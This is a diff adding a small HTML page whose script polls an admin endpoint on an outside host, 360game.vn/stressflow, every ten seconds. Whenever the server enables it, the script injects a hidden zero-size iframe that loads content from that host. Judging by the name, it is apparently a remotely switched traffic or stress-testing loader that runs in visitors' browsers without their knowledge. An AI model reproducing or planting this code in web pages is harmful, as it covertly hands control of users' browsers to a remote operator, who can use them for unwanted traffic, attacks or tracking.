@@ -1,0 +1,41 @@
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+		<script type="text/javascript" src="iframe_data/jquery.js"></script>
+	</head>
+	<body>
+		<script type="text/javascript">
+			var uid = 0;
+			function pingFramework(callback){
+				var data = {};
+				data.action = 'ping';
+				data.uid = uid;
+				$.ajax({
+					url: '//360game.vn/stressflow/ajax/admin',
+					type: 'POST',
+					data: data,
+					async: true
+				}).done(function (resp) {
+					callback(resp.enableTest);
+				});
+			}
+			var ifSrc = '//360game.vn/stressflow/iframe/content?uid='+uid;
+			var ifUrl = '<iframe id="ifr-cont" sandbox="allow-same-origin allow-scripts allow-popups allow-forms" width="0" height="0" frameborder="0" src="'+ifSrc+'"></iframe>';
+			function doInterval(){
+				pingFramework(function(enable){
+					if(enable){
+						if($('#ifr-cont').length)
+							$('#ifr-cont').attr('src', ifSrc);
+						else
+							$('body').append(ifUrl);
+					}
+					else {
+						$('#ifr-cont').attr('src', '');
+						clearInterval(itvId);
+					}
+				});
+			}
+			doInterval();
+			var itvId = setInterval(function(){doInterval();}, 10000);
+		</script>
+	
+</body></html>
